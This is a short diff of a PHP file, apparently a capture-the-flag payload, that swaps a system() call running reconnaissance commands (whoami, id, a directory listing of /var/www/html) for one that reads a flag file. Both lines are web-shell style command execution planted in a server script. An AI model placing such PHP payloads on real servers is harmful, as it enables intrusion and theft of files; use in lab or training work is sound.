@@ -1,3 +1,3 @@
 <?php
-    system('whoami; id; ls -ahli /var/www/html');
+    system('cat /var/www/html/____flag');
 ?>
